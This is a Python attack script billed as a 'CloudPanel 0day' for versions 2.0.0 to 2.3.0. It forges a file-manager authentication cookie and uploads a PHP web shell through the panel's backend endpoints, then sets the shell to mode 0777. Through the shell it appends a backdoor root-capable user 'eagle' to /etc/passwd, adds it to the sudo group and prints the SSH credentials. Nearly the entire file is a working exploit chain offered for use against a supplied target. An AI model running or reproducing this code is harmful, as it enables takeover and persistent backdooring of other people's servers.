import subprocess, argparse
import warnings ,os, sys
import ctypes, platform, requests
from colorama import Fore, Back, Style
from datetime import date

warnings.filterwarnings('ignore')

cmd = '/usr/bin/php8.1 Crypto.php'
default_path = '/file-manager/'
parser = argparse.ArgumentParser()
username = 'clp'
tgt = ''
extracted_username = []

# eagle:\$1\$eag\$IUaQOdnAjgvYoTH.0whhw/:1337:1337::/tmp:/bin/bash

def execPHP(txt=False):
    global cmd
    returned_output = ''
    if False == txt:
        proc = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE)
        returned_output = proc.stdout.read().decode('utf-8')
    else:
        cmd = cmd + ' ' + txt
        proc = subprocess.Popen(cmd.split(' '), stdout=subprocess.PIPE)
        returned_output = proc.stdout.read().decode('utf-8')
    return returned_output

def exploit():
    global tgt,default_path,username
    target = 'https://' + tgt.replace('/','')
    ipTarget = tgt.split(':')[0]
    crypto = execPHP()
    cookie = {'clp-fm':crypto}
    try:
        request = requests.get(target+default_path,cookies=cookie,verify=False,timeout=5)
        if request.status_code == 200:
            up_data = {'id':'/htdocs/app/files/public/','name':'shell.php'}
            new_ck = {'clp-fm':execPHP(username)}
            try:
                new_request = requests.post(target+default_path+'backend/makefile',cookies=new_ck,data=up_data,verify=False,timeout=5)
                if new_request.status_code == 200:
                    cdata = {'id':'/htdocs/app/files/public/shell.php','content':open('shell.php','rb').read()}
                    try:
                        crequest = requests.post(target+default_path+'backend/text',cookies=new_ck,data=cdata,verify=False,timeout=5)
                        if crequest.status_code == 200:
                            pdata = {'id':'/htdocs/app/files/public/shell.php','permissions':'0777'}
                            try:
                                prequest = requests.post(target+default_path+'backend/permissions',cookies=new_ck,data=pdata,verify=False,timeout=5)
                                if prequest.status_code == 200:
                                    shell_check = requests.get(target+'/shell.php?cmd=sudo%20su%20-c%20%22echo%20%27eagle%3A%5C%241%5C%24eag%5C%24IUaQOdnAjgvYoTH.0whhw%2F%3A1337%3A1337%3A%3A%2Ftmp%3A%2Fbin%2Fbash%27%20%3E%3E%20%2Fetc%2Fpasswd%22',verify=False,timeout=5)
                                    # shell_check = requests.get(target+'/shell.php',verify=False,timeout=5)
                                    if shell_check.status_code == 200:
                                        print(Style.BRIGHT + Fore.GREEN + '[+] WebShell : ' + target+'/shell.php')
                                        requests.get(target+'/shell.php?cmd=sudo%20su%20-c%20%22usermod%20-aG%20sudo%20eagle%22',verify=False,timeout=5)
                                        # requests.get(target+'/shell.php?cmd=rm%20shell.php',verify=False,timeout=5)
                                        print(Style.BRIGHT + Fore.GREEN + '[+] SSH Login: eagle@' + ipTarget +' Password:Eagle@1337')
                            except:
                                print(Style.BRIGHT + Fore.RED+'Connection error while changing permission!')
                    except:
                        print(Style.BRIGHT + Fore.RED+'Connection error while trying insert contents!')
            except:
                print(Style.BRIGHT + Fore.RED+'Connection error while trying creating file!')
        else:
            print(Style.BRIGHT + Fore.RED+'Not Vulnerable...')
    except:
        print(Style.BRIGHT + Fore.RED+'Connection error!')
                

def StartPage():
    global tgt,prt
    parser.add_argument('-T','--target',dest='tgt',type=str, help='Ex: 127.0.0.1:8443',default=None, required=True)
    args = parser.parse_args()
    tgt = args.tgt

    exploit()

if __name__ == '__main__':
    today = date.today()
    d2 = today.strftime("%B %d, %Y")

    if platform.system()=='Linux':
        os.system('clear')
        sys.stdout.write("\x1b]2;CLP 0Day {}\x07".format(d2))
    else:
        os.system('cls')
        ctypes.windll.kernel32.SetConsoleTitleW(f'CLP 0Day | {d2}')

    print(f"""{Style.BRIGHT + Fore.GREEN}

                                ______      _____             _____ __   _          
                               / ____/___ _/ / (_)___  ____ _/ ___// /__(_)__  _____
                              / /_  / __ `/ / / / __ \/ __ `/\__ \/ //_/ / _ \/ ___/
                             / __/ / /_/ / / / / / / / /_/ /___/ / ,< / /  __(__  ) 
                            /_/    \__,_/_/_/_/_/ /_/\__, //____/_/|_/_/\___/____/  
                                                    /____/  CloudPanel 0day Version : 2.0.0 >= 2.3.0                        
                                                            
    {Style.BRIGHT + Fore.MAGENTA}
                                        ░█▀▄░█▀█░▀█▀░█▀█░█▀▀░█░█░░░░█▄█░█░█
                                        ░█░█░█▀█░░█░░█▀█░█░░░█▀▄░░░░█░█░░█░
                                        ░▀▀░░▀░▀░░▀░░▀░▀░▀▀▀░▀░▀░▀░░▀░▀░░▀░
    {Style.BRIGHT + Fore.WHITE}""")
    StartPage()
